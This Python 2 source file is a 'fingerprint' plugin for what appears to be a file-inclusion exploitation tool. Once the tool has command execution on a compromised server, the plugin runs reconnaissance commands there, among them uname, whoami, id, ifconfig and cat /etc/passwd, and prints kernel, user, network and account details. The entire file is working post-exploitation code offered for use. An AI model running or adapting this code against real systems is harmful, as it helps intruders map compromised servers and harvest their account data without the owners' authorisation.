from plugininterface import basePlugin
import inspect
import os

class fingerprint(basePlugin):
        
    def plugin_init(self):
        pass
        
    def plugin_loaded(self):
        pass
        
       
    def plugin_exploit_modes_requested(self, langClass, isSystem, isUnix):
        ret = []

        if (isSystem):
            attack = ("Returns general info on server", "fingerprint.finger")
            ret.append(attack)
        return(ret)

        
    def plugin_callback_handler(self, callbackstring, haxhelper):
        if (callbackstring == "fingerprint.finger"):
            if (haxhelper.isUnix()):
                print '\n########### General Info ###########'
                print 'Kernel: ' + haxhelper.executeSystemCommand(haxhelper.getUNAMECommand())
                print 'Hostname: ' + haxhelper.executeSystemCommand('hostname')
                print 'Uptime: ' + haxhelper.executeSystemCommand('uptime ')
                print '############# System #################'
                print 'Proc: ' + haxhelper.executeSystemCommand("cat /proc/cpuinfo | grep 'model name' ")
                print 'Ram: ' + haxhelper.executeSystemCommand("cat /proc/meminfo | grep 'MemTotal' ")
                print 'Php Ver: ' + haxhelper.executeSystemCommand("php -i | grep -m 1  'PHP Version' ")
                print '########### User Info ##############'
                print 'Current User: ' + haxhelper.executeSystemCommand('whoami ')
                print 'User ID: '+ haxhelper.executeSystemCommand('id')
                print '########### Interfaces #############'
                print '            Ifconfig\n'
                print haxhelper.executeSystemCommand('ifconfig ')
                print '########### /etc/passwd ############'
                print haxhelper.executeSystemCommand('cat /etc/passwd ')
                print '########################################################################'
                print '\n Fingerprinting complete\n'
                

